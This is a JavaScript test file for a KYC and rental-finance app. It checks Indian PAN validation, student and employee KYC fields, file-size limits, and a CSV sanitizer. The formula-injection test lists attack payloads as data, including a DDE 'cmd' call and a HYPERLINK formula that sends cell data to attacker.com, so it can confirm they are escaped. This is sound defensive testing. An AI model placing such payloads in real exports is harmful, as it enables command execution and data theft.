const { describe, it } = require('node:test');
const assert = require('node:assert');

/**
 * SECURITY & KYC COMPLIANCE TEST
 * 1. PAN syntax verification according to Indian Income Tax format.
 * 2. Role-specific KYC schema rules (Student vs Working Professional).
 * 3. Sanitized CSV export against formula injection (=, +, -, @).
 * 4. Document upload constraints (< 2MB file limit).
 */

const PAN_REGEX = /^[A-Z]{5}[0-9]{4}[A-Z]$/;

function validatePAN(pan) {
  if (!pan) return false;
  return PAN_REGEX.test(pan.trim().toUpperCase());
}

function sanitizeCSVCell(value) {
  if (value === null || value === undefined) return '';
  const str = String(value);
  // Strip dangerous spreadsheet formula triggers: =, +, -, @, tab, CR
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`; // Prefix with single quote to force literal text in Excel/Google Sheets
  }
  return str;
}

function validateFileSize(bytes, maxMb = 2) {
  const maxBytes = maxMb * 1024 * 1024;
  return bytes <= maxBytes;
}

describe('KYC & Tax ID Security Tests', () => {
  it('should validate legal Indian PAN numbers accurately', () => {
    // Valid standard PANs
    assert.strictEqual(validatePAN('ABCDE1234F'), true);
    assert.strictEqual(validatePAN('xyzpq9876z'), true); // auto uppercase check
    assert.strictEqual(validatePAN('BKMPK4521L'), true);

    // Invalid PANs
    assert.strictEqual(validatePAN('ABC1234F'), false); // too short
    assert.strictEqual(validatePAN('ABCDEF234F'), false); // 6th char is letter, must be digit
    assert.strictEqual(validatePAN('ABCDE12345'), false); // ends in digit, must be letter
    assert.strictEqual(validatePAN('12345ABCDE'), false); // starts with numbers
    assert.strictEqual(validatePAN(''), false);
    assert.strictEqual(validatePAN(null), false);
  });

  it('should enforce distinct KYC requirements for Students vs Working Professionals', () => {
    // Student KYC schema validator
    const validateStudentKYC = (data) => {
      const errors = [];
      if (!data.full_name) errors.push('Name required');
      if (!data.college_name) errors.push('College required');
      if (!data.roll_number) errors.push('Roll number required');
      if (!data.address_proof_url) errors.push('Address proof required');
      return errors;
    };

    // Employee KYC schema validator
    const validateEmployeeKYC = (data) => {
      const errors = [];
      if (!data.full_name) errors.push('Name required');
      if (!data.company_name) errors.push('Company required');
      if (!data.pan || !validatePAN(data.pan)) errors.push('Valid PAN required');
      if (!data.aadhaar_front_url) errors.push('Aadhaar front required');
      return errors;
    };

    // Valid student data
    const studentOk = validateStudentKYC({
      full_name: 'Amit Patel',
      college_name: 'IIT Delhi',
      roll_number: '2024CS101',
      address_proof_url: 'https://storage/proof.jpg',
    });
    assert.strictEqual(studentOk.length, 0);

    // Incomplete student data
    const studentFail = validateStudentKYC({
      full_name: 'Amit Patel',
      college_name: '',
      roll_number: '',
    });
    assert.strictEqual(studentFail.length, 3);

    // Valid employee data
    const empOk = validateEmployeeKYC({
      full_name: 'Priya Sharma',
      company_name: 'Infosys',
      pan: 'ABCDE1234F',
      aadhaar_front_url: 'https://storage/aadhaar.jpg',
    });
    assert.strictEqual(empOk.length, 0);

    // Invalid employee PAN
    const empFail = validateEmployeeKYC({
      full_name: 'Priya Sharma',
      company_name: 'Infosys',
      pan: 'INVALID_PAN',
      aadhaar_front_url: 'https://storage/aadhaar.jpg',
    });
    assert.strictEqual(empFail.includes('Valid PAN required'), true);
  });
});

describe('Sanitized Financial CSV Formula Injection Defense', () => {
  it('should neutralize malicious formula triggers in tenant names or notes', () => {
    // Attack payload examples: command execution or external URL exfiltration via spreadsheet formulas
    const attacks = [
      '=cmd|"/C calc"!A0',
      '+HYPERLINK("http://attacker.com?leak="&A1, "Click Here")',
      '-2+3+cmd|',
      '@SUM(1+1)*cmd|',
      '\t=2+5',
    ];

    attacks.forEach((payload) => {
      const sanitized = sanitizeCSVCell(payload);
      assert.ok(sanitized.startsWith("'"), `Payload "${payload}" must be escaped with a leading quote`);
    });

    // Safe regular values should not be altered
    assert.strictEqual(sanitizeCSVCell('Rahul Sharma'), 'Rahul Sharma');
    assert.strictEqual(sanitizeCSVCell('Rent for March 2026'), 'Rent for March 2026');
    assert.strictEqual(sanitizeCSVCell(8500), '8500');
  });
});

describe('Document Upload Constraints', () => {
  it('should enforce < 2MB limit on uploaded documents and photos', () => {
    const oneMbBytes = 1 * 1024 * 1024;
    const onePointNineMb = 1.9 * 1024 * 1024;
    const twoPointOneMb = 2.1 * 1024 * 1024;
    const fiveMbBytes = 5 * 1024 * 1024;

    assert.strictEqual(validateFileSize(oneMbBytes), true);
    assert.strictEqual(validateFileSize(onePointNineMb), true);
    assert.strictEqual(validateFileSize(twoPointOneMb), false);
    assert.strictEqual(validateFileSize(fiveMbBytes), false);
  });
});

